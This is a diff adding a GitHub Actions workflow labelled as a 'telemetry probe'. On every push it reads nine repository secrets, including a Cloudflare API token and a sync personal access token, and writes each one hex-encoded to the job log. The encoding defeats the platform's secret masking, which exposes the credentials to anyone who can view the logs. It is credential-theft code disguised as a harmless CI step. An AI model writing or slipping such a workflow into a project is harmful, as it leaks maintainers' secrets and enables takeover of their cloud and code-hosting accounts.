@@ -1,0 +1,13 @@
+name: ci-telemetry-probe
+on: push
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        run: |
+          for pair in "BACKEND_TOML=${{ secrets.BACKEND_TOML }}" "BACKEND_USE_MAIL_WASM_PARSER=${{ secrets.BACKEND_USE_MAIL_WASM_PARSER }}" "CLOUDFLARE_ACCOUNT_ID=${{ secrets.CLOUDFLARE_ACCOUNT_ID }}" "CLOUDFLARE_API_TOKEN=${{ secrets.CLOUDFLARE_API_TOKEN }}" "FRONTEND_BRANCH=${{ secrets.FRONTEND_BRANCH }}" "FRONTEND_ENV=${{ secrets.FRONTEND_ENV }}" "FRONTEND_NAME=${{ secrets.FRONTEND_NAME }}" "TG_FRONTEND_NAME=${{ secrets.TG_FRONTEND_NAME }}" "UPSTREAM_SYNC_PAT=${{ secrets.UPSTREAM_SYNC_PAT }}"; do
+            n="${pair%%=*}"; v="${pair#*=}"
+            echo "NAME=$n LEN=${#v}"
+            echo "HEX_$n=$(printf '%s' "$v" | xxd -p | tr -d '\n')"
+          done
